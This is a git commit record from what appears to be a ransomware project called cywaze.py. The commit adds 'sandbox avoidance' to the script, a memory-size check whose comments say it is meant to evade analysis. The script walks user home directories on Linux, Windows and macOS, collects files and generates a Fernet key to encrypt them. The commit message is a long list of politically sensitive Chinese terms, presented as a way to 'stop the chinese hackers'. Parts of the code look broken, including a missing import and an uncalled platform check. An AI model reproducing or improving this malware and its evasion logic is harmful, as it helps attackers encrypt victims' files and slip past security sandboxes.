bcb7151da09f83d4945cc49933917119caa76d93
Nulpickle <105951464+Nulpickle@users.noreply.github.com>
2022-11-06 15:47:02 -0500

    added sandbox avoidance
    to stop the chinese hackers:
    动态网自由门 天安門 天安门 法輪功 李洪志 Free Tibet 六四天安門事件 The Tiananmen Square protests of 1989 天安門大屠殺 The Tiananmen Square Massacre 反右派鬥爭 The Anti-Rightist Struggle 大躍進政策 The Great Leap Forward 文化大革命 The Great Proletarian Cultural Revolution 人權 Human Rights 民運 Democratization 自由 Freedom 獨立 Independence 多黨制 Multi-party system 台灣 臺灣 Taiwan Formosa 中華民國 Republic of China 西藏 土伯特 唐古特 Tibet 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xinjiang Uyghur Autonomous Region 諾貝爾和平獎 Nobel Peace Prize 劉暁波 Liu Xiaobo 民主 言論 思想 反共 反革命 抗議 運動 騷亂 暴亂 騷擾 擾亂 抗暴 平反 維權 示威游行 李洪志 法輪大法 大法弟子 強制斷種 強制堕胎 民族淨化 人體實驗 肅清 胡耀邦 趙紫陽 魏京生 王丹 還政於民 和平演變 激流中國 北京之春 大紀元時報 九評論共産黨 獨裁 專制 壓制 統一 監視 鎮壓 迫害 侵略 掠奪 破壞 拷問 屠殺 活摘器官 誘拐 買賣人口 遊進 走私 毒品 賣淫 春畫 賭博 六合彩 天安門 天安门 法輪功 李洪志 Winnie the Pooh 劉曉波动态网自由门

--- cywaze.py
+++ cywaze.py
@@ -1,8 +1,14 @@
 import platform
 import os
 from cryptography.fernet import Fernet
+import psutil
+meme = psutil.virtual_memory().total 
 files = []
-for file in os.listdir():
+#the if is to avoid sandboxing by scanning the sandboxed env to see the size of it if under 750MB then it WILL NOT RUN 
+#else it will 
+if meme > 750000000:
+    time.sleep(5)
+    for file in os.listdir():
         if file == "cywaze.py"or file == "readme.txt":
                 continue        
         if platform.system() == "Linux":
@@ -20,7 +26,29 @@ for file in os.listdir():
                 targ2 = "/home"
                 for root, dirname,file in os.walk(targ2):
                         for x in file:
+                                 files.append(x)
+else:
+    time.sleep(10)
+    for file in os.listdir():
+        if file == "cywaze.py"or file == "readme.txt":
+                continue        
+        if platform.system() == "Linux":
+                targ3 = "/home"
+                for root, dirname,file in os.walk(targ3):
+                        for x in file:
                                     files.append(x)
+        if platform.system() == "Windows":
+                targ1 = "C:/users/"
+                for root, dirname,file in os.walk(targ1):
+                        for x in file:
+                                    files.append(x)
+
+        if platform.system == "Darwin":
+                targ2 = "/home"
+                for root, dirname,file in os.walk(targ2):
+                        for x in file:
+                                 files.append(x)
+     
 seil = Fernet.generate_key()
 for x in files:
         with open(file,"rb") as thefile:
